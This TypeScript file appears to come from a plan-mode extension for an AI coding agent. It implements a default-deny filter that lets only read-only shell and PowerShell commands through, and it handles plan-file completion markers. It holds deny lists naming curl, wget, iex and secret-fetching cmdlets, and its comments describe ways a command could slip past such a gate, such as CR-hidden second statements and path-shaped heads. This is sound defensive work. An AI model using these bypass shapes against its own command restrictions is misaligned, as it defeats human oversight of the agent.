	// around, so the raw word count can only over-count — and the normalized reading has
	// already dropped the quotes, which would make one quoted filename look like two
	// words and refuse a read.
	if (head === "uniq" && reading === "raw") {
		const words = segment.match(/"[^"]*"|'[^']*'|\S+/g) ?? [];
		if (words.slice(1).filter((word) => !word.startsWith("-")).length > 1) return false;
	}

	// git reads a program out of configuration for a handful of flags: `--ext-diff`
	// and `--textconv` run the configured diff driver, `--filters` runs the clean
	// filter, `-O`/`--open-files-in-pager` pipes output into a command, `--paginate`
	// starts the configured pager, and `--help` starts `man`. `git -c …`/
	// `--config-env=…` never get past the allowlist, but these flags need no override of
	// their own — they reach a program the user configured earlier — so they are refused
	// by name. Plain `git diff` still runs a program if the *repository* config names one
	// (`diff.external`, a `diff=` driver in `.gitattributes`, `core.fsmonitor` for
	// `git status`, `gpg.program` for `log.showSignature`): no flag is involved there, so
	// it is out of reach for this judge and documented as a limitation instead.
	if (head === "git") {
		if (hasDangerousShortFlag(segment, "O")) return false;
		if (hasDangerousLongOption(segment, GIT_EXEC_OPTIONS)) return false;
	}

	if (PURE_READ_BASH_COMMANDS.has(head)) return true;

	// Non-pure-read heads (echo, printf, git, npm, env, ...) are checked against
	// the mutating keywords on the full segment text (quotes intact) — e.g.
	// `git log --grep='npm install' -5` stays blocked.
	const segmentNoFdRedirs = segment.replace(/\b[012]>&[012]\b/g, "");
	if (MUTATING_BASH_PATTERNS.some((pattern) => pattern.test(segmentNoFdRedirs))) return false;

	return true;
}

/**
 * Rewrite a command the way bash does before it hands arguments to a program:
 * remove quotes, resolve unquoted backslash escapes, and decode `$'…'` ANSI-C
 * strings (including `\xNN`, `\NNN`, `\t`, and `\n`). Escapes this does not know
 * are kept as written, which is what bash does too. The result is used only as a
 * second reading of the same command line.
 */
export function bashNormalized(command: string): string {
	let out = "";
	let i = 0;
	while (i < command.length) {
		const char = command[i];
		if (char === "'") {
			// Single quotes are literal: nothing inside is escaped or expanded.
			const end = command.indexOf("'", i + 1);
			if (end === -1) {
				out += command.slice(i + 1);
				break;
			}
			out += command.slice(i + 1, end);
			i = end + 1;
			continue;
		}
		if (char === "$" && command[i + 1] === "'") {
			const [decoded, next] = decodeAnsiCString(command, i + 2);
			out += decoded;
			i = next;
			continue;
		}
		if (char === '"') {
			i += 1;
			while (i < command.length && command[i] !== '"') {
				// Inside double quotes only `\`, `$`, `` ` `` and a newline can be escaped.
				if (command[i] === "\\" && '"\\$`'.includes(command[i + 1] ?? "")) i += 1;
				out += command[i];
				i += 1;
			}
			i += 1;
			continue;
		}
		if (char === "\\") {
			const escaped = command[i + 1];
			if (escaped === undefined) break;
			// Backslash-newline is a line continuation: bash removes both characters.
			// Production only feeds this function NL-free segments (`judgeSafeCommand`
			// joins first), so this branch matters for direct calls; consuming the run
			// pairwise keeps its parity right for raw text as well (an even run keeps a
			// literal backslash and the newline, an odd one drops the escaped newline).
			if (escaped !== "\n") out += escaped;
			i += 2;
			continue;
		}
		out += char;
		i += 1;
	}
	return out;
}

/** Decode a `$'…'` string starting after its opening quote; returns the text and the index after the closing quote. */
function decodeAnsiCString(command: string, start: number): [string, number] {
	const simple: Record<string, string> = {
		a: "\x07",
		b: "\b",
		e: "\x1b",
		E: "\x1b",
		f: "\f",
		n: "\n",
		r: "\r",
		t: "\t",
		v: "\v",
		"\\": "\\",
		"'": "'",
		'"': '"',
	};
	let out = "";
	let i = start;
	while (i < command.length) {
		const char = command[i];
		if (char === "'") return [out, i + 1];
		if (char !== "\\") {
			out += char;
			i += 1;
			continue;
		}
		const escaped = command[i + 1];
		if (escaped === undefined) return [out, i + 1];
		if (escaped in simple) {
			out += simple[escaped];
			i += 2;
			continue;
		}
		if (escaped === "x") {
			const hex = /^[0-9a-fA-F]{1,2}/.exec(command.slice(i + 2))?.[0];
			if (hex) {
				out += String.fromCharCode(Number.parseInt(hex, 16));
				i += 2 + hex.length;
				continue;
			}
		}
		if (escaped >= "0" && escaped <= "7") {
			const octal = /^[0-7]{1,3}/.exec(command.slice(i + 1))?.[0] ?? "";
			out += String.fromCharCode(Number.parseInt(octal, 8));
			i += 1 + octal.length;
			continue;
		}
		if (escaped === "u" || escaped === "U") {
			const width = escaped === "u" ? 4 : 8;
			const hex = new RegExp(`^[0-9a-fA-F]{1,${width}}`).exec(command.slice(i + 2))?.[0];
			const codePoint = hex ? Number.parseInt(hex, 16) : Number.NaN;
			if (hex && codePoint <= 0x10ffff) {
				out += String.fromCodePoint(codePoint);
				i += 2 + hex.length;
				continue;
			}
		}
		if (escaped === "c") {
			const control = command[i + 2];
			if (control) {
				out += String.fromCharCode(control.toUpperCase().charCodeAt(0) ^ 64);
				i += 3;
				continue;
			}
		}
		// Bash keeps the backslash for an escape it does not know.
		out += `\\${escaped}`;
		i += 2;
	}
	return [out, i];
}

// Options that turn a read-only command into a launcher or a writer. Each list is
// matched by prefix (see hasDangerousLongOption), so it covers the abbreviated
// spellings these parsers accept as well as the full ones.
const SORT_WRITE_OPTIONS = ["--output", "--compress-program", "--temporary-directory"];
// ripgrep runs a program for `--pre`/`--pre-glob`, and `--hostname-bin` names the
// program it runs to resolve the hostname it prints in its header. `--pager` is not a
// ripgrep flag (checked against `rg --help`), so it is not listed.
const RG_EXEC_OPTIONS = ["--pre", "--pre-glob", "--hostname-bin"];
const FD_EXEC_OPTIONS = ["--exec", "--exec-batch"];
const TREE_WRITE_OPTIONS = ["--output"];
const DATE_SET_OPTIONS = ["--set"];
// bat starts a pager program with `--pager`, and `--config-file` can point at a file
// whose contents name one (a file the caller may be able to write).
const BAT_EXEC_OPTIONS = ["--pager", "--config-file"];
const GIT_EXEC_OPTIONS = [
	"--open-files-in-pager",
	"--ext-diff",
	"--textconv",
	"--filters",
	"--paginate",
	// `git log --help` hands the terminal to `man`, which starts the configured
	// pager, so the help flag is a launcher like the rest.
	"--help",
];

/**
 * A long option may be abbreviated to any unambiguous prefix (`--o`, `--ou`,
 * `--out` and `--output` are the same flag to sort), so a token is refused when its
 * option part — the text before `=` — is a prefix of one of the dangerous options.
 * Comparing against the full names covers every abbreviation without listing them,
 * and the full spelling with them.
 */
function hasDangerousLongOption(segment: string, options: readonly string[]): boolean {
	for (const rawToken of segment.split(/\s+/)) {
		const token = rawToken.replace(/^['"]+/, "").toLowerCase();
		if (!token.startsWith("--")) continue;
		const equals = token.indexOf("=");
		const option = equals === -1 ? token : token.slice(0, equals);
		if (option.length > 2 && options.some((dangerous) => dangerous.startsWith(option))) return true;
	}
	return false;
}

/**
 * Short flags can share one token (`sort -nroOUT f` is `-o OUT`), so every letter of
 * every short-flag token is checked against the dangerous set.
 */
function hasDangerousShortFlag(segment: string, letters: string): boolean {
	const pattern = new RegExp(`^-[a-zA-Z]*[${letters}]`);
	return segment.split(/\s+/).some((rawToken) => pattern.test(rawToken.replace(/^['"]+/, "")));
}

// PowerShell needs its own dialect. The POSIX allowlist matches whole command
// words (`rg`, `git status`), while a PowerShell command is a Verb-Noun cmdlet
// with aliases, script blocks, and its own expansion syntax: judging it by the
// POSIX list would refuse nearly every native PowerShell form. Like the POSIX
// one, this dialect is default-deny and checks every pipeline stage on its own.
const ALLOWED_POWERSHELL_HEADS: ReadonlySet<string> = new Set([
	// Read-only cmdlets whose verb is not Get-* (Get-* has its own rule below).
	"test-path",
	"resolve-path",
	"split-path",
	"join-path",
	"convert-path",
	"measure-object",
	"compare-object",
	"sort-object",
	"select-object",
	"where-object",
	"group-object",
	"join-string",
	"out-string",
	"format-table",
	"format-list",
	"format-wide",
	"format-custom",
	"select-string",
	"convertto-json",
	"convertfrom-json",
	// Read-only aliases of the cmdlets above and of Get-*.
	"ls",
	"dir",
	"gci",
	"cat",
	"type",
	"gc",
	"sls",
	"gv",
	"gm",
	"ft",
	"fl",
	"fw",
	"sort",
	"measure",
	"compare",
	"group",
	"where",
	"select",
]);

// Verbs that mutate state or run code. PowerShell owns Verb-Noun names, so the
// verb alone identifies the intent even when the cmdlet is not installed.
const POWERSHELL_MUTATING_HEAD_PATTERN =
	/^(?:set|add|clear|remove|move|copy|rename|new|out|export|import|invoke|start|stop|restart|install|uninstall|update|enable|disable|register|unregister|save|publish|send|enter|exit|push|pop|resume|suspend|submit|debug|write)-/;

// Nouns that write, whatever the verb in front of them: this catches module
// cmdlets that mutate a file under a verb the list above does not name.
const POWERSHELL_WRITING_NOUN_PATTERN = /-(?:item|content)$/;

// Aliases of the mutating cmdlets. Default-deny already refuses every one of
// them (none is reachable through the POSIX fallback), so this list is redundant
// by construction: emptying it changes no test outcome, which is why it is
// defence in depth rather than the gate that stops them. It stays so the refusal
// is explicit and independent of the allowlist above; the *read* alias entries in
// ALLOWED_POWERSHELL_HEADS are the part that is load-bearing.
const POWERSHELL_MUTATING_ALIASES: ReadonlySet<string> = new Set([
	"rm",
	"del",
	"erase",
	"rd",
	"rmdir",
	"ri",
	"mv",
	"move",
	"mi",
	"rni",
	"copy",
	"cp",
	"cpi",
	"ni",
	"si",
	"sc",
	"sa",
	"ac",
	"clc",
	"clear",
	"curl",
	"wget",
	"iex",
]);

// Get-* is read-only in itself, apart from cmdlets that block on interactive
// input or hand out stored secrets.
const POWERSHELL_DENIED_GET_HEADS: ReadonlySet<string> = new Set([
	"get-credential",
	"get-secret",
	"get-secretinfo",
	"get-secretvault",
]);

export function isSafePowerShellCommand(command: string): boolean {
	const trimmed = command.trim();
	if (!trimmed) return false;

	// PowerShell's tokenizer treats CR and LF as the same statement separator: it
	// normalizes CRLF, and a bare CR is a newline of its own. Every line-break form
	// therefore has to become a separator here, or a bare CR would hide a second
	// statement behind an allowlisted head (`Get-ChildItem\rRemove-Item x`).
	const singleLine = trimmed.replace(/\r\n?|\n/g, "; ");

	// A stray control character is refused: a read-only command needs none of them,
	// and the parser treats some (a vertical tab, for instance) as whitespace. The
	// loop mirrors the line-break set the normalization above rewrites -- CR, LF,
	// NEL (U+0085), LS (U+2028), PS (U+2029) -- and exempts tab, which separates
	// tokens rather than statements. Keep the members spelled out instead of a
	// "code < 0x20" test: the three non-ASCII ones are what such a simplification
	// would silently drop. (No regex: biome's noControlCharactersInRegex rejects a
	// control-character class.)
	const hasStrayControlCharacter = [...singleLine].some((character) => {
		const code = character.codePointAt(0) ?? 0;
		// Tab separates tokens. CR and LF are exempt only because the normalization
		// above already rewrote every line-break form, so these two arms are
		// unreachable by construction; they stay so the loop covers the whole set.
		if (code === 0x09 || code === 0x0a || code === 0x0d) return false;
		return code < 0x20 || code === 0x7f || code === 0x85 || code === 0x2028 || code === 0x2029;
	});
	if (hasStrayControlCharacter) return false;

	// Here-strings (@' ... '@ / @" ... "@) and stop-parsing (--%) are matched
	// before quotes are stripped, because the opening token carries the hazard.
	if (/@['"]/.test(singleLine) || /--%/.test(singleLine)) return false;

	// Single quotes are literal in PowerShell, double quotes are not: `$x` and
	// `$(...)` expand inside them, so only single-quoted text may be dropped.
	const withoutSingleQuotes = singleLine.replace(/'[^']*'/g, " ");

	// Variables, subexpressions, script blocks, argument splatting (@), the call
	// operator (&) and backtick escapes all inject or execute code, and a
	// read-only command never needs them. Refusing `&` outright is also why the
	// `&&` case in `splitShellSegments` is unreachable from this dialect (the POSIX
	// dialect still needs it).
	if (/[$`@{}()&]/.test(withoutSingleQuotes)) return false;

	// Redirects write files in PowerShell too (> , >> , *> , 2>).
	if (/[<>]/.test(withoutSingleQuotes)) return false;

	// A parameter is never quoted in PowerShell, so both quote styles can be
	// dropped here: that keeps a quoted search pattern such as "-Command" from
	// being misread. The rule is anchored to argument position so a read-only
	// command that merely mentions the token (`Get-Command Get-Content`,
	// `cat my-command.txt`) still passes. `-EncodedCommand` and `-Command` hand a
	// script to a host that this allowlist refuses anyway; the rule keeps the
	// refusal explicit in one place instead of relying on the head list.
	const withoutQuotes = singleLine.replace(/"[^"]*"|'[^']*'/g, " ");
	if (/(?:^|\s)-(?:encodedcommand|command)\b/i.test(withoutQuotes)) return false;

	// Acting parameters turn a `Get-*` discovery cmdlet into a mutating or
	// host-acting one: `Get-Help about_Profiles -Online` opens the default browser,
	// a third-party `Get-WindowsUpdate -Install` persists changes despite the verb,
	// `Get-CimInstance -MethodName` invokes a method. The set is curated, not a
	// proof of read-only -- the `get-` prefix is a naming convention -- so it is a
	// second gate beside the head list, anchored to argument position like the rule
	// above.
	if (
		/(?:^|\s)-(?:online|install|methodname|acceptall|autoreboot|download)\b/i.test(withoutQuotes)
	) {
		return false;
	}

	const segments = splitShellSegments(singleLine);
	if (segments.length === 0) return false;

	for (const segment of segments) {
		// Same path guard as the POSIX judge: `Get-ChildItem/../../bin/x` is a path,
		// not a cmdlet, and the head rules below would otherwise read its leading
		// word as an allowlisted cmdlet name.
		if (hasPathShapedHead(segment)) return false;
		// No separate dot-source check is needed: `firstCommandWord` requires a
		// letter or underscore first, so `. .\script.ps1` has no head and is refused.
		const head = firstCommandWord(segment);
		if (!head || !isAllowedPowerShellHead(head, segment)) return false;
	}
	return true;
}

function isAllowedPowerShellHead(head: string, segment: string): boolean {
	if (POWERSHELL_MUTATING_ALIASES.has(head)) return false;
	if (ALLOWED_POWERSHELL_HEADS.has(head)) return true;
	if (POWERSHELL_MUTATING_HEAD_PATTERN.test(head)) return false;
	// Get-* is read-only apart from the cmdlets refused above. This rule runs
	// before the noun rule on purpose: `Get-Content` and `Get-Item` are read-only
	// yet carry a writing noun.
	if (head.startsWith("get-")) return !POWERSHELL_DENIED_GET_HEADS.has(head);
	if (POWERSHELL_WRITING_NOUN_PATTERN.test(head)) return false;
	// PowerShell runs native executables as well, so a stage the POSIX dialect
	// already accepts (`git status --short`, `grep -rn x .`) stays accepted here.
	return isSafeCommand(segment);
}

// Splits a command on unquoted separators (`;`, `&`, `&&`, `||`, `|`, `|&`), so
// quoted search patterns like "a;b" or "x | y" do not produce phantom segments and a
// quoted `;` is data rather than a boundary. The quote-and-escape roles come from
// scanShellText — the same model the expansion and redirect checks read — so an escaped
// quote is a literal character rather than the start of a quoted region
// (`echo \" ; git tag -d v2` is two commands) and an escaped separator stays inside its
// segment (`echo a \; b` is one command).
function splitShellSegments(command: string): string[] {
	const roles = scanShellText(command);
	const segments: string[] = [];
	let current = "";
	const live = (index: number) => roles[index] === "unquoted";
	for (let i = 0; i < command.length; i++) {
		const ch = command[i];
		if (live(i)) {
			const next = command[i + 1];
			// `|` and `|&` separate pipeline stages, `&&`/`||` separate and-or lists, and a
			// bare `&` backgrounds the command — the following command runs too and has to
			// be judged on its own. `>&` and `&>` are redirects (already refused below), not
			// separators.
			if (ch === "|") {
				segments.push(current);
				current = "";
				if (live(i + 1) && (next === "|" || next === "&")) i++;
				continue;
			}
			if (ch === ";") {
				segments.push(current);
				current = "";
				continue;
			}
			if (ch === "&") {
				if (live(i + 1) && next === "&") {
					segments.push(current);
					current = "";
					i++;
					continue;
				}
				const redirect = (live(i + 1) && next === ">") || (live(i - 1) && command[i - 1] === ">");
				if (!redirect) {
					segments.push(current);
					current = "";
					continue;
				}
			}
		}
		current += ch;
	}
	segments.push(current);
	// An empty segment carries no command (`echo hi;`, `a || b` after the operator was
	// consumed), so it is not a boundary anyone can hide behind.
	return segments.filter((segment) => segment.trim() !== "");
}

// True when the segment's first token carries a path separator. Such a token is
// a file to execute rather than a command word, and it is exactly the shape that
// slips past prefix-anchored patterns (`cat/../../bin/rm -rf x`).
function hasPathShapedHead(segment: string): boolean {
	const match = /^\s*(\S+)/.exec(segment);
	return match ? /[/\\]/.test(match[1]) : false;
}

function firstCommandWord(segment: string): string | undefined {
	const match = /^\s*([A-Za-z_][A-Za-z0-9_+-]*)/.exec(segment);
	return match?.[1]?.toLowerCase();
}

export function planFilePath(cwd: string): string {
	return path.join(cwd, PLAN_FILE_NAME);
}

export function readPlanFile(cwd: string): string | undefined {
	try {
		const content = fs.readFileSync(planFilePath(cwd), "utf-8").trim();
		return content || undefined;
	} catch {
		return undefined;
	}
}

// A handoff is complete only when the model says so in the plan file, so the
// completion signal is read from disk instead of inferred from pi's event
// lifecycle. The declaration may live in the plan file or in plan.progress.md,
// whichever file the model used for progress tracking.
function planSignalFilePaths(cwd: string): string[] {
	// Guard before any path math: path.join on a non-string cwd would throw.
	if (typeof cwd !== "string") return [];
	return [planFilePath(cwd), path.join(cwd, PLAN_PROGRESS_FILE_NAME)];
}

// Mirrors isPlanFileTarget: never read or rewrite a plan file reached through a
// symlink, so the extension does not touch whatever the link points at. A
// missing file is not readable and therefore carries no declaration.
function isReadablePlanSignalFile(filePath: string): boolean {
	try {
		return !fs.lstatSync(filePath).isSymbolicLink();
	} catch {
		return false;
	}
}

type PlanDoneDeclaration = { lineIndex: number; line: string };

// The declaration is the marker token on the file's last non-empty line: the
// handoff asks the model to append it when the last step is done, and a model
// closing its final sentence on that line still counts. Only the last line is
// inspected so a marker the model merely quoted into the plan body (the
// handoff prompt shows the bracketed form) cannot end the handoff early.
function findPlanDoneDeclaration(filePath: string): PlanDoneDeclaration | undefined {
	if (!isReadablePlanSignalFile(filePath)) return undefined;
	try {
		const lines = fs.readFileSync(filePath, "utf-8").split("\n");
		for (let index = lines.length - 1; index >= 0; index -= 1) {
			const line = lines[index] ?? "";
			if (!line.trim()) continue;
			return PLAN_DONE_TOKEN_PATTERN.test(line) ? { lineIndex: index, line } : undefined;
		}
		return undefined;
	} catch {
		// A missing or unreadable file carries no completion signal.
		return undefined;
	}
}

function hasPlanDoneMarker(cwd: string): boolean {
	return planSignalFilePaths(cwd).some(
		(filePath) => findPlanDoneDeclaration(filePath) !== undefined,
	);
}

// True when no stale declaration is left behind. A new handoff must not archive
// on the marker of the previous one, so the token is removed from the line that
// declared it -- only the token, because the rest of that line is the model's
// own closing words and has to survive the reset.
function stripPlanDoneMarkers(cwd: string): boolean {
	let clean = true;
	for (const filePath of planSignalFilePaths(cwd)) {
		const declaration = findPlanDoneDeclaration(filePath);
		if (!declaration) continue;
		try {
			const lines = fs.readFileSync(filePath, "utf-8").split("\n");
			const stripped = declaration.line.replace(PLAN_DONE_TOKEN_GLOBAL_PATTERN, "").trimEnd();
			if (stripped) lines[declaration.lineIndex] = stripped;
			else lines.splice(declaration.lineIndex, 1);
			fs.writeFileSync(filePath, lines.join("\n"), "utf-8");
		} catch (error) {
			// The stale marker survived, so the next settle could archive this
			// fresh handoff on it: report instead of failing silently.
			clean = false;
			const message = error instanceof Error ? error.message : String(error);
			console.error(`Plan mode could not clear the completion marker in ${filePath}: ${message}`);
		}
	}
	return clean;
}

// True only when the plan really left the working tree: the callers gate their
// state reset and success notification on it, so a failed archive keeps the
// handoff open instead of reporting a success that did not happen.
function archivePlanFile(ctx: ExtensionContext): boolean {
	// Guard before any path math: path.join on a non-string cwd would throw
	// outside the try/catch below.
	if (typeof ctx.cwd !== "string") return false;
	try {
		const planPath = planFilePath(ctx.cwd);
		const progressPath = path.join(ctx.cwd, PLAN_PROGRESS_FILE_NAME);
		if (!fs.existsSync(planPath) && !fs.existsSync(progressPath)) return false;
		fs.mkdirSync(path.join(ctx.cwd, PLAN_ARCHIVE_DIR_NAME), { recursive: true });
		const stamp = new Date().toISOString().replace(/[:.]/g, "-");
		// Archive the plan file and, if the model created one, the progress
		// file beside it, so the working tree stays clean after implementation.
		for (const [sourcePath, prefix] of [
			[planPath, PLAN_FILE_NAME],
			[progressPath, PLAN_PROGRESS_FILE_NAME],
		] as const) {
			if (!fs.existsSync(sourcePath)) continue;
			const archivedPath = path.join(
				ctx.cwd,
				PLAN_ARCHIVE_DIR_NAME,
				`${prefix.replace(/\.md$/, "")}-${stamp}.md`,
			);
			fs.renameSync(sourcePath, archivedPath);
		}
		return true;
	} catch (error) {
		const message = error instanceof Error ? error.message : String(error);
		console.error(`Plan mode archive failed: ${message}`);
		return false;
	}
}

export function isPlanFileTarget(cwd: string, input: unknown): boolean {
	if (!isRecord(input)) return false;
	const p = input.path;
	if (typeof p !== "string") return false;
	if (path.resolve(cwd, p) !== path.resolve(cwd, PLAN_FILE_NAME)) return false;
	try {
		// Refuse to write through a symlinked plan file; a missing file is fine (creation).
		return !fs.lstatSync(planFilePath(cwd)).isSymbolicLink();
	} catch {
		return true;
	}
}

function messageContainsLegacyPlanModeContextArtifact(message: unknown) {
	const candidate = unwrapSessionMessage(message);
	return candidate.customType === PLAN_CONTEXT_MESSAGE_TYPE;
}

function messageContainsInactivePlanModeArtifact(message: unknown) {
	const candidate = unwrapSessionMessage(message);
	return candidate.customType === PROPOSED_PLAN_MESSAGE_TYPE;
}

function unwrapSessionMessage(message: unknown) {
	const entry = message as { message?: unknown };
	return (entry.message ?? message) as { role?: string; customType?: string; content?: unknown };
}

function withPlanAdherenceReminder(messages: unknown[]): unknown[] {
	if (messages.length === 0) return messages;
	const candidate = unwrapSessionMessage(messages[messages.length - 1]);
	// Do not stack a user-role reminder directly after a user message: the
	// handoff already carries the full guidance, and consecutive same-role
	// entries pollute the UI and can trip strict provider role checks.
	if (candidate.role === "user") return messages;
	// Check the whole list, not just the last message: once an earlier
	// reminder has been persisted into the transcript it anchors the model
	// by itself, so a long implementation accumulates exactly one copy
	// instead of one per LLM call.
	if (hasAdherenceReminder(messages)) return messages;
	return [...messages, { message: buildAdherenceReminderMessage() }];
}

function hasAdherenceReminder(messages: unknown[]): boolean {
	return messages.some((message) => {
		const candidate = unwrapSessionMessage(message);
		return messageText(candidate.content).includes(PLAN_ADHERENCE_MARKER);
	});
}

function buildAdherenceReminderMessage() {
	return {
		role: "user",
		content: [{ type: "text", text: planAdherenceReminder() }],
		timestamp: Date.now(),
	};
}

function planAdherenceReminder() {
	return `${PLAN_ADHERENCE_MARKER} You are implementing the plan in ${PLAN_FILE_NAME} in the working directory. Follow its steps and ${PLAN_PROGRESS_TRACKING_INSTRUCTION}; ${PLAN_DONE_DECLARATION_INSTRUCTION}. If a step must change, update the plan first and note the deviation and why. When done, report deviations and anything left unfinished.`;
}

function messageText(content: unknown): string {
	if (typeof content === "string") return content;
	if (!Array.isArray(content)) return "";
	return content
		.filter(
			(part): part is { type: "text"; text: string } =>
				isRecord(part) && part.type === "text" && typeof part.text === "string",
		)
		.map((part) => part.text)
		.join("\n");
}
